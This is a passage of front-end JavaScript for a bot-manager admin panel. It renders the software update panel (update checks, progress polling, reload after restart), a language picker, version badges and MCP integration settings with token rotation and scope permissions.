    // Wire theme picker events after the panel is in the DOM
    if (window.NexusTheme) window.NexusTheme.bindEvents();
    // Render the Logiciel (software/update) panel
    renderSoftwarePanel();
    // Render the MCP integration panel
    renderMcpPanel(settings);
    // Render user accounts and webhooks (admin-only pages).
    renderUsersPanel();
    renderWebhooksPanel();
    // Remember the server values so leaving a dirty tab can restore them.
    captureSettingsSnapshot();
    if (SETTINGS_SECTION_IDS.includes(focusSection) && focusSection !== 'general') {
      const navItem = document.querySelector(`.settings-nav-item[data-section="${focusSection}"]`);
      if (navItem) activateSettingsSection(focusSection, navItem);
    }
    // Refresh the version badges in #about-version / #about-version-help so
    // they don't stay at the default "—" placeholder if the user navigates
    // to Settings -> About before the initial refreshVersionBadge() call
    // completes (or before any data is in cache).
    refreshVersionBadge();
  } catch (e) {
    page.innerHTML = `<div class="loader" style="color:var(--red);">${esc(e.message)}</div>`;
  }
}

// ------------------------------------------------------------
// SOFTWARE / UPDATE PANEL
// ------------------------------------------------------------
let _updatePollTimer = null;
let _updateBootNotice = false;
let _updateRestartSeen = false;
let _updatePollFails = 0;
let _updateReloadTimer = null;
let _updateHealthTimer = null;
let _updateAckTimer = null;
let _updateAckAttempted = false;

async function renderSoftwarePanel(status = null) {
  const panel = document.getElementById('software-panel');
  if (!panel) return;
  if (!status) {
    panel.innerHTML = `<div class="loader"><div class="spinner spinner-lg"></div></div>`;
  }
  try {
    if (!status) status = await NexusAPI.update.status();
    panel.innerHTML = buildSoftwareHTML(status);
    bindSoftwareActions(status);
    // Only a genuinely running update needs live polling. A finished
    // update (success/failed) is a stable result and must not restart
    // polling (which used to keep the old "in progress" state alive).
    if (status.status === 'running') {
      startUpdatePolling();
    }
    if (status.status === 'success') {
      // The update flow reloads the page automatically. A finished update
      // should not leave the steps card waiting for a manual "Confirm".
      scheduleUpdateAck();
    }
  } catch (e) {
    panel.innerHTML = `<div class="card"><div class="card-body" style="color:var(--red);">${esc(e.message)}</div></div>`;
  }
}

function statusBadgeFor(status) {
  const _t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  switch (status) {
    case 'up_to_date':       return { label: _t('software.statusUpToDate'),     icon: 'ti-circle-check',   color: 'green' };
    case 'update_available': return { label: _t('software.statusUpdateAvail'), icon: 'ti-arrow-up-circle', color: 'amber' };
    case 'ahead':            return { label: _t('software.statusAhead'),       icon: 'ti-flask',          color: 'blue'  };
    case 'running':          return { label: _t('software.statusRunning'),     icon: 'ti-loader-2',       color: 'blue'  };
    case 'success':          return { label: _t('software.statusSuccess'),     icon: 'ti-circle-check',   color: 'green' };
    case 'failed':           return { label: _t('software.statusFailed'),      icon: 'ti-alert-circle',   color: 'red'   };
    case 'check_failed':     return { label: _t('software.statusCheckFailed'), icon: 'ti-cloud-off',      color: 'red'   };
    case 'idle':
    default:                 return { label: _t('software.statusIdle'),        icon: 'ti-help-circle',    color: 'gray'  };
  }
}

function buildSoftwareHTML(s) {
  const _t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  const loc = (window.NexusI18n && window.NexusI18n.current) ? (window.NexusI18n.current() === 'fr' ? 'fr-FR' : window.NexusI18n.current() === 'de' ? 'de-DE' : 'en-GB') : 'en-GB';
  const local = s.local || { version: '?' };
  const remoteVer = s.remoteVersion || '—';
  const lastCheck = s.lastCheck ? new Date(s.lastCheck).toLocaleString(loc) : '—';
  const lastUpdate = s.lastUpdateAt ? new Date(s.lastUpdateAt).toLocaleString(loc) : '—';
  const badge = statusBadgeFor(s.status);
  const errorMsg = s.checkError ? `<div class="form-hint" style="color:var(--red);margin-top:6px;"><i class="ti ti-alert-triangle"></i>${esc(s.checkError)}</div>` : '';
  const remoteUrl = s.remoteUrl ? `<a href="${esc(s.remoteUrl)}" target="_blank" rel="noopener" style="color:var(--blue);">${esc(s.remoteUrl)}</a>` : '—';

  // Update progress / steps (only if running, success or failed)
  let progressBlock = '';
  if (s.status === 'running' || (s.steps && (s.status === 'success' || s.status === 'failed'))) {
    progressBlock = buildProgressHTML(s);
  } else if (s.status === 'success' && !s.steps) {
    progressBlock = `
      <div class="card" style="margin-bottom:16px;border-color:var(--green-b);">
        <div class="card-body" style="display:flex;align-items:center;gap:12px;">
          <i class="ti ti-circle-check" style="font-size:24px;color:var(--green);"></i>
          <div>
            <div style="font-weight:600;color:var(--tx-1);">${esc(_t('updateProgress.success'))}</div>
            <div style="font-size:12px;color:var(--tx-3);">${esc(_t('updateProgress.completedOn', { date: lastUpdate }))}</div>
          </div>
          <button class="btn btn-ghost btn-sm" onclick="ackUpdate()" style="margin-left:auto;">${esc(_t('common.confirm'))}</button>
        </div>
      </div>`;
  } else if (s.status === 'failed' && !s.steps) {
    progressBlock = `
      <div class="card" style="margin-bottom:16px;border-color:var(--red-b);">
        <div class="card-body">
          <div style="display:flex;align-items:center;gap:12px;">
            <i class="ti ti-alert-circle" style="font-size:24px;color:var(--red);"></i>
            <div>
              <div style="font-weight:600;color:var(--tx-1);">${esc(_t('updateProgress.failed'))}</div>
              <div style="font-size:12px;color:var(--tx-3);">${esc(s.lastError || _t('updateProgress.unknownError'))}</div>
            </div>
            <button class="btn btn-ghost btn-sm" onclick="ackUpdate()" style="margin-left:auto;">${esc(_t('common.confirm'))}</button>
          </div>
        </div>
      </div>`;
  }

  const updateButton = (() => {
    if (s.status === 'update_available') {
      return `<button class="btn btn-primary" id="btn-perform-update" onclick="performUpdate()"><i class="ti ti-download"></i>${esc(_t('settingsPage.updateNow', { ver: remoteVer }))}</button>`;
    }
    if (s.status === 'running') {
      return `<button class="btn btn-ghost" disabled><span class="spinner spinner-sm"></span>&nbsp;${esc(_t('updateProgress.inProgress'))}</button>`;
    }
    if (s.status === 'up_to_date') {
      return `<button class="btn btn-success" disabled><i class="ti ti-check"></i>${esc(_t('software.upToDate'))}</button>`;
    }
    return '';
  })();

  return `
    ${progressBlock}

    <!-- Version card -->
    <div class="card" style="margin-bottom:16px;">
      <div class="card-header"><span class="card-title"><i class="ti ti-package"></i>${esc(_t('software.title'))}</span></div>
      <div class="card-body">
        <div class="metric-row">
          <span class="metric-key">${esc(_t('software.name'))}</span>
          <span class="metric-val"><strong>${esc(_t('common.appName'))}</strong></span>
        </div>
        <div class="metric-row">
          <span class="metric-key">${esc(_t('software.installed'))}</span>
          <span class="metric-val">v${esc(local.version)}</span>
        </div>
        <div class="metric-row">
          <span class="metric-key">${esc(_t('software.latest'))}</span>
          <span class="metric-val">v${esc(remoteVer)}</span>
        </div>
        <div class="metric-row">
          <span class="metric-key">${esc(_t('software.status'))}</span>
          <span class="metric-val">
            <span class="badge badge-${esc(badge.color)}"><span class="badge-dot"></span><i class="ti ${esc(badge.icon)}"></i>&nbsp;${esc(badge.label)}</span>
          </span>
        </div>
        <div class="metric-row">
          <span class="metric-key">${esc(_t('software.lastCheck'))}</span>
          <span class="metric-val">${esc(lastCheck)}</span>
        </div>
        ${s.remotePublishedAt ? `<div class="metric-row"><span class="metric-key">${esc(_t('software.published'))}</span><span class="metric-val">${esc(new Date(s.remotePublishedAt).toLocaleDateString(loc))}</span></div>` : ''}
        ${s.remoteUrl ? `<div class="metric-row"><span class="metric-key">${esc(_t('software.githubLink'))}</span><span class="metric-val">${remoteUrl}</span></div>` : ''}
        ${errorMsg}
      </div>
      <div class="card-footer" style="display:flex;gap:8px;align-items:center;flex-wrap:wrap;">
        <button class="btn btn-ghost" id="btn-check-update" onclick="checkForUpdates()"><i class="ti ti-refresh"></i>${esc(_t('settingsPage.checkUpdates'))}</button>
        ${updateButton}
      </div>
    </div>

    <!-- Useful links -->
    <div class="card">
      <div class="card-header"><span class="card-title"><i class="ti ti-link"></i>${esc(_t('settingsPage.usefulLinks'))}</span></div>
      <div class="card-body" style="padding:0;">
        <a href="https://github.com/Julien48003/nexus-bot-manager" target="_blank" rel="noopener" class="link-row">
          <i class="ti ti-brand-github" style="color:var(--tx-1);"></i>
          <div class="link-row-text"><strong>${esc(_t('settingsPage.github'))}</strong><span>${esc(_t('settingsPage.githubDesc'))}</span></div>
          <i class="ti ti-external-link link-row-arrow"></i>
        </a>
        <a href="https://nexus.dj-julien.fr/" target="_blank" rel="noopener" class="link-row">
          <i class="ti ti-world" style="color:var(--blue);"></i>
          <div class="link-row-text"><strong>${esc(_t('settingsPage.officialSite'))}</strong><span>${esc(_t('settingsPage.officialSiteDesc'))}</span></div>
          <i class="ti ti-external-link link-row-arrow"></i>
        </a>
        <a href="https://nexus.dj-julien.fr/docs.html" target="_blank" rel="noopener" class="link-row">
          <i class="ti ti-book" style="color:var(--green);"></i>
          <div class="link-row-text"><strong>${esc(_t('settingsPage.documentation'))}</strong><span>${esc(_t('settingsPage.documentationDesc'))}</span></div>
          <i class="ti ti-external-link link-row-arrow"></i>
        </a>
        <a href="https://nexus.dj-julien.fr/changelog.html" target="_blank" rel="noopener" class="link-row">
          <i class="ti ti-history" style="color:var(--amber);"></i>
          <div class="link-row-text"><strong>${esc(_t('settingsPage.changelog'))}</strong><span>${esc(_t('settingsPage.changelogDesc'))}</span></div>
          <i class="ti ti-external-link link-row-arrow"></i>
        </a>
      </div>
    </div>
  `;
}

function buildProgressHTML(s) {
  const _t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  if (!s.steps) return '';
  const stepRows = s.steps.map(step => {
    let icon = '<i class="ti ti-clock"></i>', color = 'var(--tx-3)';
    if (step.status === 'done')    { icon = '<i class="ti ti-check"></i>'; color = 'var(--green)'; }
    else if (step.status === 'running') { icon = '<i class="ti ti-loader-2"></i>'; color = 'var(--blue)'; }
    else if (step.status === 'failed')  { icon = '<i class="ti ti-x"></i>'; color = 'var(--red)'; }
    const currentRow = step.status === 'running' ? 'font-weight:600;color:var(--tx-1);' : 'color:var(--tx-2);';
    return `<div style="display:flex;align-items:center;gap:10px;padding:6px 0;${currentRow}"><span style="width:18px;color:${color};font-weight:700;">${icon}</span><span style="flex:1;">${esc(step.label)}</span>${step.error ? `<span style="color:var(--red);font-size:11px;">${esc(step.error)}</span>` : ''}</div>`;
  }).join('');
  const pct = Math.round(s.percent || 0);
  const fromVer = s.fromVersion || '?';
  const toVer   = s.toVersion   || '?';
  const headerColor = s.status === 'success' ? 'var(--green)' : s.status === 'failed' ? 'var(--red)' : 'var(--blue)';
  const headerLabel = s.status === 'success' ? _t('updateProgress.success') : s.status === 'failed' ? _t('updateProgress.failed') : _t('updateProgress.inProgress');
  const actionBtn = (s.status === 'success' || s.status === 'failed')
    ? `<button class="btn btn-ghost btn-sm" onclick="ackUpdate()">${_t('common.confirm')}</button>`
    : '';
  const errorBlock = s.status === 'failed' && s.error
    ? `<div style="margin-top:12px;padding:10px;background:var(--red-bg);border:1px solid var(--red-b);border-radius:var(--r);font-family:var(--font-mono);font-size:11px;color:var(--red);">${esc(s.error)}</div>`
    : '';
  return `
    <div class="card" style="margin-bottom:16px;border-color:${headerColor};">
      <div class="card-header">
        <span class="card-title" style="color:${headerColor};">
          <i class="ti ${s.status === 'success' ? 'ti-circle-check' : s.status === 'failed' ? 'ti-alert-circle' : 'ti-loader-2'}"></i>
          ${esc(headerLabel)}
        </span>
        <span style="font-family:var(--font-mono);font-size:11px;color:var(--tx-3);">v${esc(fromVer)} -> v${esc(toVer)}</span>
      </div>
      <div class="card-body">
        <div style="display:flex;align-items:center;gap:12px;margin-bottom:14px;">
          <div class="progress" style="flex:1;"><div class="progress-fill blue" style="width:${pct}%;"></div></div>
          <span style="font-family:var(--font-mono);font-size:12px;color:var(--tx-3);width:42px;text-align:right;">${pct}%</span>
        </div>
        <div>${stepRows}</div>
        ${errorBlock}
      </div>
      ${actionBtn ? `<div class="card-footer" style="display:flex;justify-content:flex-end;">${actionBtn}</div>` : ''}
    </div>`;
}

function bindSoftwareActions(s) {
  // Currently all actions are inline; nothing to bind.
}

// -- Language picker ------------------------------------
function bindLanguagePicker(rootSel) {
  const root = document.querySelector(rootSel);
  if (!root) return;
  root.querySelectorAll('.lang-pick').forEach(btn => {
    btn.addEventListener('click', async () => {
      const code = btn.dataset.lang;
      if (!code || !window.NexusI18n) return;
      NexusI18n.setLang(code);
      root.querySelectorAll('.lang-pick').forEach(b => b.classList.toggle('active', b.dataset.lang === code));
      try { await NexusAPI.auth.setLanguage(code); } catch (_) {}
      // Re-render the whole UI immediately so labels, buttons, toasts and
      // dynamic content all switch in the same frame.
      applyLanguage(code);
    });
  });
}

/**
 * Apply the active language to the entire UI:
 *   - every element with data-i18n / data-i18n-html / data-i18n-placeholder / data-i18n-attr
 *   - the sidebar (via data-i18n already in place)
 *   - the current page is fully re-rendered so any hardcoded strings are replaced
 *   - open modals are rerendered when possible
 *   - the setup wizard chrome (header + footer buttons) is refreshed too
 */
function applyLanguage(code) {
  code = code || (window.NexusI18n ? NexusI18n.current() : 'en');
  if (!window.NexusI18n) return;
  // 1) Apply data-i18n to the static DOM (sidebar, modals, etc.)
  NexusI18n.apply();

  // 2) If the setup wizard is currently visible, re-render its body
  //    AND its chrome (header title/subtitle, footer buttons).
  const setupVisible = document.getElementById('setup-page')?.classList.contains('visible');
  if (setupVisible && typeof setupStep === 'function') {
    try {
      setupStep(_setupCurrentStep || 1);
      if (typeof applySetupChromeLanguage === 'function') applySetupChromeLanguage();
    } catch (_) {}
    return; // don't re-navigate main app pages during setup
  }

  // 3) Re-render the active page so render functions pull fresh strings.
  const page = App.currentPage || (new URLSearchParams(location.search).get('page') || 'dashboard');
  const params = App.currentParams || {};
  if (typeof navigate === 'function') {
    try { navigate(page, params); } catch (_) {}
  }
  // 4) Re-apply on the document after navigate (because navigate rewrites innerHTML)
  setTimeout(() => {
    try { NexusI18n.apply(); } catch (_) {}
    try { applyRoleVisibility(); } catch (_) {}
  }, 0);
}

async function checkForUpdates() {
  const _t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  const btn = document.getElementById('btn-check-update');
  if (btn) { btn.disabled = true; btn.innerHTML = `<span class="spinner spinner-sm"></span>&nbsp;${_t('software.checking')}`; }
  try {
    const status = await NexusAPI.update.check();
    renderSoftwarePanel(); // re-render
    if (status.status === 'update_available') {
      toast('info', _t('toasts.updateAvailable'), `v${status.remoteVersion}`);
    } else if (status.status === 'up_to_date') {
      toast('success', _t('toasts.upToDate'), _t('toasts.upToDateToast', { ver: status.remoteVersion }));
    } else if (status.status === 'check_failed') {
      toast('error', _t('toasts.checkFailed'), status.checkError || _t('toasts.githubError'));
    }
  } catch (e) {
    toast('error', _t('toasts.error'), e.message);
    renderSoftwarePanel();
  }
}

async function performUpdate() {
  const _t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  // Confirmation modal
  const s = await NexusAPI.update.status().catch(() => null);
  if (!s) return;
  const fromV = s.local?.version || '?';
  const toV   = s.remoteVersion || '?';
  confirm(
    _t('software.performConfirm'),
    _t('software.performConfirmDesc', { from: fromV, to: toV }),
    () => doPerformUpdate(),
    false  // not a danger action
  );
}

async function doPerformUpdate() {
  const _t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  const btn = document.getElementById('btn-perform-update');
  if (btn) { btn.disabled = true; btn.innerHTML = `<span class="spinner spinner-sm"></span>&nbsp;${_t('common.processing')}`; }
  try {
    await NexusAPI.update.perform();
    _updateRestartSeen = false;
    _updatePollFails = 0;
    _updateAckAttempted = false;
    if (_updateAckTimer) { clearTimeout(_updateAckTimer); _updateAckTimer = null; }
    if (_updateReloadTimer) { clearTimeout(_updateReloadTimer); _updateReloadTimer = null; }
    if (_updateHealthTimer) { clearTimeout(_updateHealthTimer); _updateHealthTimer = null; }
    startUpdatePolling();
    await renderSoftwarePanel();
    toast('info', _t('toasts.updateStarted'), _t('toasts.updateLiveTrace'));
  } catch (e) {
    toast('error', _t('toasts.cantStart'), e.message);
    renderSoftwarePanel();
  }
}

function startUpdatePolling() {
  if (_updatePollTimer) return;
  _updatePollFails = 0;
  _updatePollTimer = setInterval(async () => {
    try {
      const status = await NexusAPI.update.status();
      _updatePollFails = 0;
      const step = status.currentStep || '';
      if (step === 'restart' || step === 'verify' || step === 'finalize'
          || (status.status === 'running' && (Number(status.percent) || 0) >= 90)) {
        _updateRestartSeen = true;
      }
      renderSoftwarePanel(status);
      if (status.status === 'success') {
        // The status turns to success only once the new version is running.
        // Reload immediately instead of leaving the page idle for 5 seconds.
        stopUpdatePolling();
        scheduleReloadAfterRestart(0);
      } else if (status.status === 'failed') {
        stopUpdatePolling();
      }
    } catch (e) {
      // The backend is normally unreachable while PM2 restarts the panel.
      // Start probing health right away and reload as soon as it answers.
      _updatePollFails++;
      if (_updateRestartSeen || _updatePollFails >= 3) {
        stopUpdatePolling();
        scheduleReloadAfterRestart(0);
      }
    }
  }, 1500);
}

function stopUpdatePolling() {
  if (_updatePollTimer) {
    clearInterval(_updatePollTimer);
    _updatePollTimer = null;
  }
}

/**
 * The update restarts PM2, so give it a few seconds before probing the
 * health endpoint. Once the new process answers, reload the whole page so
 * the sidebar version, settings panel and update status are all fresh.
 */
function scheduleReloadAfterRestart(delayMs = 0) {
  if (_updateReloadTimer) return;
  _updateReloadTimer = setTimeout(() => {
    const startedAt = Date.now();
    const probe = async () => {
      try {
        const res = await fetch('/api/health', { cache: 'no-store' });
        if (res.ok) {
          // This reload is part of the update flow, not the user leaving.
          App.suppressUnloadGuard = true;
          location.reload();
          return;
        }
      } catch (_) { /* still restarting */ }
      if (Date.now() - startedAt > 30000) {
        App.suppressUnloadGuard = true;
        location.reload();
        return;
      }
      _updateHealthTimer = setTimeout(probe, 1000);
    };
    probe();
  }, delayMs);
}

function scheduleUpdateAck() {
  if (_updateAckTimer || _updateAckAttempted) return;
  _updateAckAttempted = true;
  _updateAckTimer = setTimeout(() => {
    _updateAckTimer = null;
    ackUpdate();
  }, 3000);
}

async function ackUpdate() {
  if (_updateAckTimer) { clearTimeout(_updateAckTimer); _updateAckTimer = null; }
  try { await NexusAPI.update.acknowledge(); } catch (_) {}
  renderSoftwarePanel();
}

// ------------------------------------------------------------
// VERSION BADGE + UPDATE NOTIFICATIONS
// ------------------------------------------------------------
async function refreshVersionBadge(forceRemote = false) {
  const _t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  try {
    const ver = await NexusAPI.update.version();
    App.localVersion = ver.version;
    // Display the version next to the instance name (NOT in the logout area).
    const instVer = document.getElementById('sb-instance-version');
    if (instVer) {
      instVer.style.display = '';
      instVer.textContent = 'v' + ver.version;
    }
    // Also fill about-version if present
    document.querySelectorAll('#about-version, #about-version-help').forEach(el => {
      el.textContent = 'v' + ver.version;
    });

    // Update checks are an administrator feature. Regular accounts still
    // display the installed version but never call the admin-only endpoints.
    if (!isAdmin()) {
      App.updateAvailable = false;
      if (instVer) instVer.classList.remove('has-update');
      return;
    }
    // Then check for updates. On login/boot we force a GitHub check instead
    // of reading the cached status from a previous session.
    try {
      const status = forceRemote
        ? await NexusAPI.update.check()
        : await NexusAPI.update.status();
      App.updateAvailable = status.status === 'update_available';
      // Update instance-version chip styling on update availability
      if (instVer) instVer.classList.toggle('has-update', App.updateAvailable);
      // If update available AND not acknowledged, show banner on topbar
      if (App.updateAvailable && !sessionStorage.getItem('nbm.upd.acked')) {
        showUpdateBanner(status.remoteVersion);
      }
      // If a restart was detected and we have not acked yet, show toast on boot
      if (status.status === 'success' && status.lastUpdateAt) {
        const lastBootToastKey = 'nbm.upd.bootToast.' + status.lastUpdateAt;
        if (!sessionStorage.getItem(lastBootToastKey)) {
          sessionStorage.setItem(lastBootToastKey, '1');
          toast('success', _t('toasts.updateApplied'), _t('toasts.nowOnVersion', { ver: ver.version }));
        }
        // The update flow reloads the panel at the end. Acknowledge the
        // finished update on this boot so the old steps card cannot come back
        // requiring a manual confirmation.
        ackUpdate();
      }
    } catch (e2) {
      // Network/GitHub unavailable — silent
    }
  } catch (e) {
    // Backend not reachable — hide chip
    const instVer = document.getElementById('sb-instance-version');
    if (instVer) instVer.style.display = 'none';
  }
}

function showUpdateBanner(remoteVersion) {
  const _t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  // Avoid duplicates
  if (document.getElementById('update-banner')) return;
  const banner = document.createElement('div');
  banner.id = 'update-banner';
  banner.className = 'update-banner';
  banner.innerHTML = `
    <i class="ti ti-arrow-up-circle" style="font-size:20px;color:var(--amber);"></i>
    <div class="ub-text">
      <strong>${esc(_t('software.updateAvailable'))}</strong> — v${esc(remoteVersion || '?')}
      <span style="color:var(--tx-3);font-size:12px;">${esc(_t('common.appName'))}</span>
    </div>
    <div class="ub-cta">
      <button class="btn btn-primary btn-sm" onclick="openSoftwareSettings()"><i class="ti ti-download"></i>${esc(_t('common.confirm'))}</button>
      <button class="btn btn-ghost btn-sm" onclick="dismissUpdateBanner()"><i class="ti ti-x"></i></button>
    </div>`;
  const main = document.getElementById('main');
  if (main && main.firstChild) main.insertBefore(banner, main.firstChild);
}

function dismissUpdateBanner() {
  sessionStorage.setItem('nbm.upd.acked', '1');
  const b = document.getElementById('update-banner');
  if (b) b.remove();
}

function openSoftwareSettings() {
  // Navigate to Settings and open the Software tab in the same pass.
  navigate('settings', { settingsSection: 'software' });
  dismissUpdateBanner();
}

function renderMcpPanel(settings = App.settings || {}) {
  const _t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  const panel = document.getElementById('mcp-panel');
  if (!panel) return;
  const enabled = !!settings.mcp_enabled;
  const token = settings.mcp_token || '';
  const endpoint = `${location.origin}/mcp`;

  panel.innerHTML = `
    <div class="card mb-16">
      <div class="card-header">
        <span class="card-title"><i class="ti ti-plug-connected"></i>${esc(_t('mcpSettings.title'))}</span>
        <span class="badge ${enabled ? 'badge-online' : 'badge-unknown'}"><span class="badge-dot"></span>${esc(enabled ? _t('mcpSettings.enabled') : _t('mcpSettings.disabled'))}</span>
      </div>
      <div class="card-body">
        <div class="form-group">
          <label class="toggle">
            <input type="checkbox" id="mcp-enabled" ${enabled ? 'checked' : ''}/>
            <span class="toggle-label">${esc(_t('mcpSettings.enableLabel'))}</span>
          </label>
          <div class="form-hint">${esc(_t('mcpSettings.enableHint'))}</div>
        </div>
        <div class="form-group">
          <label class="form-label">${esc(_t('mcpSettings.endpoint'))}</label>
          <div class="flex gap-6">
            <input class="form-control mono" id="mcp-endpoint" readonly value="${esc(endpoint)}"/>
            <button class="btn btn-ghost btn-sm" type="button" onclick="mcpCopy('endpoint')"><i class="ti ti-copy"></i>${esc(_t('common.copy'))}</button>
          </div>
          <div class="form-hint">${esc(_t('mcpSettings.endpointHint'))}</div>
        </div>
        <div class="form-group">
          <label class="form-label">${esc(_t('mcpSettings.token'))}</label>
          <div class="flex gap-6">
            <input class="form-control mono" id="mcp-token" readonly type="password" value="${esc(token)}"/>
            <button class="btn btn-ghost btn-sm" type="button" onclick="mcpCopy('token')"><i class="ti ti-copy"></i>${esc(_t('common.copy'))}</button>
            <button class="btn btn-ghost btn-sm" type="button" onclick="rotateMcpToken()"><i class="ti ti-refresh"></i>${esc(_t('mcpSettings.rotate'))}</button>
          </div>
          <div class="form-hint">${esc(_t('mcpSettings.tokenHint'))}</div>
        </div>
        <div class="form-hint" style="margin-top:10px;"><i class="ti ti-info-circle"></i>${esc(_t('mcpSettings.hostsHint'))}</div>
      </div>
      <div class="card-footer" style="display:flex;justify-content:flex-end;gap:8px;">
        <button class="btn btn-ghost" onclick="showMcpConfig()"><i class="ti ti-braces"></i>${esc(_t('mcpSettings.showConfig'))}</button>
        <button class="btn btn-primary" id="btn-save-mcp" onclick="saveMcpSettings()"><i class="ti ti-device-floppy"></i>${esc(_t('common.save'))}</button>
      </div>
    </div>

    <div class="card mb-16" style="border-color:var(--amber-b);">
      <div class="card-header"><span class="card-title" style="color:var(--amber);"><i class="ti ti-shield-lock"></i>${esc(_t('mcpSettings.permissionsTitle'))}</span></div>
      <div class="card-body">
        <p class="form-hint" style="margin-bottom:12px;">${esc(_t('mcpSettings.permissionsHint'))}</p>
        <div class="mcp-scope-groups">
          ${MCP_SCOPE_GROUPS.map(group => `<div class="mcp-scope-group">
            <div class="webhook-event-group-title">${esc(_t('mcpScopes.group_' + group.id))}</div>
            <div class="webhook-event-grid">
              ${group.scopes.map(scope => `<label class="user-bot-option"><input type="checkbox" class="mcp-scope-check" value="${scope}"${mcpScopeEnabled(settings.mcp_scopes, scope) ? ' checked' : ''}/><span>${esc(_t('mcpScopes.' + scope))}</span></label>`).join('')}
            </div>
          </div>`).join('')}
        </div>
        <div class="form-hint" style="margin-top:10px;"><i class="ti ti-alert-triangle" style="color:var(--amber);"></i>${esc(_t('mcpSettings.permissionsWarn'))}</div>
      </div>
      <div class="card-footer" style="display:flex;justify-content:flex-end;">
        <button class="btn btn-primary" onclick="saveMcpSettings()"><i class="ti ti-device-floppy"></i>${esc(_t('common.save'))}</button>
      </div>
    </div>

    <div class="card">
      <div class="card-header"><span class="card-title"><i class="ti ti-robot"></i>${esc(_t('mcpSettings.exposedTitle'))}</span></div>
      <div class="card-body">
        <div id="mcp-exposed-list" class="form-hint">${esc(_t('common.loading'))}</div>
        <p class="form-hint" style="margin-top:12px;">${esc(_t('mcpSettings.exposedHint'))}</p>
      </div>
    </div>`;

  NexusAPI.bots.list().then(bots => {
    const el = document.getElementById('mcp-exposed-list');
    if (!el) return;
    const exposed = (bots || []).filter(b => b.mcp_exposed);
    el.innerHTML = exposed.length
      ? exposed.map(b => `<span class="badge badge-blue" style="margin:2px 4px 2px 0;"><i class="ti ti-robot"></i>&nbsp;${esc(b.display_name || b.name)}</span>`).join('')
      : esc(_t('mcpSettings.noneExposed'));
  }).catch(() => {
    const el = document.getElementById('mcp-exposed-list');
    if (el) el.textContent = _t('mcpSettings.noneExposed');
  });
}

async function saveMcpSettings() {
  const _t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  const btn = document.getElementById('btn-save-mcp');
  if (btn) { btn.disabled = true; btn.innerHTML = `<span class="spinner spinner-sm"></span>`; }
  const scopes = {};
  document.querySelectorAll('.mcp-scope-check').forEach(el => { scopes[el.value] = el.checked; });
  try {
    const updated = await NexusAPI.system.updateSettings({
      mcp_enabled: !!document.getElementById('mcp-enabled')?.checked,
      mcp_scopes: scopes
    });
    App.settings = { ...(App.settings || {}), ...updated };
    renderMcpPanel(App.settings);
    markSettingsGroupsClean(['mcp']);
    refreshSettingsGroupsSnapshot(['mcp']);
    toast('success', _t('mcpSettings.saved'), _t('mcpSettings.savedHint'));
  } catch (e) {
    toast('error', _t('mcpSettings.saveError'), e.message);
  } finally {
    if (btn) { btn.disabled = false; btn.innerHTML = `<i class="ti ti-device-floppy"></i>${esc(_t('common.save'))}`; }
  }
}

async function rotateMcpToken() {
  const _t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  confirm(_t('mcpSettings.rotateConfirm'), _t('mcpSettings.rotateConfirmDesc'), async () => {
    try {
      // Keep an unsaved toggle state across the panel re-render.
      const pendingEnabled = !!document.getElementById('mcp-enabled')?.checked;
      const res = await NexusAPI.system.mcpRotate();
      App.settings = { ...(App.settings || {}), ...(res.settings || {}), mcp_token: res.token };
      renderMcpPanel(App.settings);
      const checkbox = document.getElementById('mcp-enabled');
      if (checkbox && pendingEnabled !== !!App.settings.mcp_enabled) checkbox.checked = pendingEnabled;
      toast('success', _t('mcpSettings.rotated'), _t('mcpSettings.rotatedHint'));
    } catch (e) {
      toast('error', _t('mcpSettings.rotateError'), e.message);
    }
  });
}

async function copyTextToClipboard(text) {
  const value = String(text == null ? '' : text);
  try {
    if (navigator.clipboard && navigator.clipboard.writeText) {
      await navigator.clipboard.writeText(value);
      return true;
    }
  } catch (_) { /* HTTP or permission denied: use the textarea fallback */ }
  let ta = null;
  try {
    ta = document.createElement('textarea');
    ta.value = value;
    ta.setAttribute('readonly', '');
    ta.style.position = 'fixed';
    ta.style.top = '-1000px';
    ta.style.opacity = '0';
    document.body.appendChild(ta);
    ta.focus();
    ta.select();
    ta.setSelectionRange(0, ta.value.length);
    return document.execCommand('copy');
  } catch (_) {
    return false;
  } finally {
    if (ta) ta.remove();
  }
}

function mcpCopy(kind) {
  const _t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  const input = document.getElementById(kind === 'endpoint' ? 'mcp-endpoint' : 'mcp-token');
  copyTextToClipboard(input ? input.value : '').then(ok => {
    if (ok) toast('success', _t('common.copied'));
    else toast('error', _t('mcpSettings.copyFailed'), _t('mcpSettings.copyFailedHint'));
  });
}

function showMcpConfig() {
  const _t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  const token = App.settings?.mcp_token || document.getElementById('mcp-token')?.value || '';
  const endpoint = `${location.origin}/mcp`;
  const config = {
    mcpServers: {
      'nexus-bot-manager': {
        type: 'streamable-http',
        url: endpoint,
        headers: { Authorization: `Bearer ${token}` }
      }
    }
  };
  const json = JSON.stringify(config, null, 2);
  const hint = token ? _t('mcpSettings.configHint') : _t('mcpSettings.configNoToken');
  const ov = document.createElement('div');
  ov.className = 'modal-overlay';
  ov.innerHTML = `<div class="modal" style="max-width:680px;">
    <div class="modal-header">
      <span class="modal-title"><i class="ti ti-braces"></i>${esc(_t('mcpSettings.configTitle'))}</span>
      <button class="btn-close" onclick="this.closest('.modal-overlay').remove()"><i class="ti ti-x"></i></button>
    </div>
    <div class="modal-body">
      <p class="form-hint" style="margin-bottom:10px;">${esc(hint)}</p>
      <pre class="mcp-config-pre">${esc(json)}</pre>
    </div>
    <div class="modal-footer">
      <button class="btn btn-ghost" onclick="this.closest('.modal-overlay').remove()">${esc(_t('common.close'))}</button>
